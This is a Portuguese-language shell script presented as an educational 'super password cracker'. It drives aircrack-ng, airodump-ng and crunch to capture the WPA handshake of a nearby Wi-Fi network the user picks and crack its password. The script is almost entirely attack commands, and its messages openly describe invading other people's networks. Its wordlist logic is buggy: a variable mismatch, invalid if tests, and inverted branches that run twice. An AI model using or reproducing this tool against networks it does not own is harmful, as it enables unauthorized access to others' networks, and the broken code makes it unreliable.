#/bin/sh
#feita por m4n3qu1n
#nao me responsabilizo se for usado para o mal
#isso é uma ferramenta educativa, etica, e explicativa.
#fassa bom uso.


echo Nao se esqueca de usar o iniciar o setup primeiro

sleep 2

echo "USE COMO USUARIO ROOT"

sleep 3

toilet -f block "BEM VINDO"

sleep 1

toilet -f block "CARREGANDO..."

sleep 3

echo bem vindo ao super quebrador de senhas do m4n3qu1n hehe
echo "caso queira desistir pressiono (ctrl + z) ou (ctrl + c)"
echo vamos começar vamos listar o que voce precisa para rodar essa script
echo "aircrack-ng (ara quebrar as senhas.)"

echo "airodump-ng (para procurar redes e obter um handshake.)"

echo "(opcional) aireplay-ng (opcional para acelear o processo para obter o handshake.)"

echo "airmom-ng (para colcoar sua interface em modo monitor e para matar todo processo que possa te impedir no ataque.)"

echo vamos começar com airmon-ng

sleep 2

airmon-ng check kill

echo "agora fechamos todos possiveis processos que possam interferir no processo."

sleep 3


clear
echo "caso não saiba qual sua interface de rede use o comando 'iwconfig' e identifique sua interface "


echo -e "\e[38;5;82mvamos la com 'airmon-ng'e defina sua interface de rede:" 
read interface

sleep 10

airmon-ng start $interface

echo "agora colocamos a sua rede em modo monitor"

sleep 2

iwconfig

echo "informe como esta a sua interface em modo monitor?(exemplo: wlan0mon):"
read monitor


sleep 2
echo "essa e apenas para ver as redes que estao perto de voce quando encontrar a que deseja hackar. anote o BSSID da redee pressione (ctrl + c)"

sleep 5

echo "agora vamos iniciar a procura por redes por perto"
echo "vamos usar o 'airodump-ng' para isso."

echo "QUANDO APARECER A REDE QUE VOCE DESEJA INVADIR ANOTE O 'BSSID' E PRESSIONE (ctrl + c)"

sleep 2

airodump-ng $monitor

echo "voce pode esperar o 'airodump-ng' capturar o 'handshake' sozinho ou abrir um segundo terminal e usar o 'aireplay-ng'"
echo "vamos continuar com 'airodump-ng' para capturar trafego de rede"
echo "OBS: olhe na parte superior esquerda da rede que voce deseja invadir se aparecer 'handshake' ou algo voce ja conseguiu obter o handshake dessa rede"
echo "abre 1 segundo terminal e use o aireplay.sh"

 sleep 40
 
 echo "agora o BSSID da rede que deseja hackar. como eu disse anteorimente vai servir para filtrar apenas essa rede monitorar apenas ela assim tendo mais precisao e so o necessario"
 
 echo -e "\e[38;5;82mqual o BSSID?:" 
 read bssid 

  echo -e "\e[38;5;82mqual o channel?:" 
 read channel
 
 sleep 10
 
airodump-ng $monitor --bssid $bssid -c $channel -w psk.cap



echo "bom parece que ja deu, vamos continuar hehe"
echo "primeiro localize onde esta o handshake que voce capturou da rede, geralmente esta no mesmo diretorio que vc executou o script"
echo "localize algo parecido com a extensao 'pcap' no final do nome"
echo "esse provalvelmente é o 'handshake' caso há varios 'handshakes' nao se preocupe sabera qaul é o certo"
echo "vamos continuar com 'aircrack-ng'. ai esta a cereja do bolo hehe. ele é quem vai descriptografar a senha com as informaçoes que voce obteve com 'airodump-ng'."

echo "lembresse do 'BSSID' sabera qual é confio em voce"
echo "ee tambem voce necessitara de uma wordlist precisa baixar uma na internet ou criar personalizadas com elpscryk.py ou crunch ou CUPP ou caso deseje  nossa WORDLIST INFINITA!!(recomendado) " 

sleep 10



function wordlist0()
{
    echo -e "\e[38;5;82monde esta a sua wordlist?:"
read wordlist1

aircrack-ng -w $wordlist -b $bssid  psk*.cap

}

function wordlist4()
{
    crunch 8 16 --stdout | aircrack-ng -w - -b $bssid  psk*.cap
}

echo -e "\e[38;5;82mquer usar nossa wordlist infinita?s ou n?(se não tera que definir o path da sua propria wordlist limitada.):"
echo 'S/N:'
read wordlist

if $wordlist -eq s 
then
    wordlist0
    else
        wordlist4
fi

if $wordlist -eq S
then
    wordlist0
    else
        wordlist4
fi

